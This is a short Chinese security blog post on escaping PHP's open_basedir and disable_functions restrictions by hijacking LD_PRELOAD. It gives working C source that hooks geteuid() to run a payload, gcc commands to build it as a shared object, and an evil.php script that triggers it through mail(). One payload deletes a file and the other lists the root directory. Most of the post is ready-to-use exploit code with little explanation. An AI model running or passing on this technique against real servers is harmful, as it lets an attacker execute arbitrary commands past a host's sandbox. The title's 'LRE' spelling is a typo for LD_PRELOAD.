---
title: LRE_PAYLOAD绕过open_basedir
tags: web安全
abbrlink: 51203
date: 2018-06-04 10:10:00
description: 利用LRE_PRELOAD绕过php代码中open_basedir的限制
keywords: LRE_PRELOAD-PHP-open_basedir
---

# LRE_PAYLOAD绕过open_basedir

参考链接:

[利用环境变量LD_PRELOAD绕过disable_function执行系统命令](http://wooyun.jozxing.cc/static/drops/tips-16054.html)

[PHP绕过open_basedir列目录的研究](https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html)

源码:

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void payload() {
	system("rm /tmp/check.txt");
}
int  geteuid() {
	if (getenv("LD_PRELOAD") == NULL) { return 0; }
	unsetenv("LD_PRELOAD");
	payload();
}

```

编译:

```
gcc -c -fPIC shell.c -o teset
gcc -shared teset -o test.so
```

evil.php

```
<?php
putenv("LD_PRELOAD=/var/www/html/preload/test.so");
	mail("a@localhost","","","","");
?>
```

执行evil.php ，可以发现check.txt被删除。

列目录的payload:

```
#include <dirent.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
void payload()
{
    DIR* dir;
    struct dirent* ptr;
    dir = opendir("/");
    FILE  *fp;
    fp=fopen("/tmp/venenoveneno","w");
    while ((ptr = readdir(dir)) != NULL) {
        fprintf(fp,"%s\n",ptr->d_name);
    }
    closedir(dir);
    fflush(fp);
}
int geteuid()
{
    if (getenv("LD_PRELOAD") == NULL) {
        return 0;
    }
    unsetenv("LD_PRELOAD");
    payload();
}
```



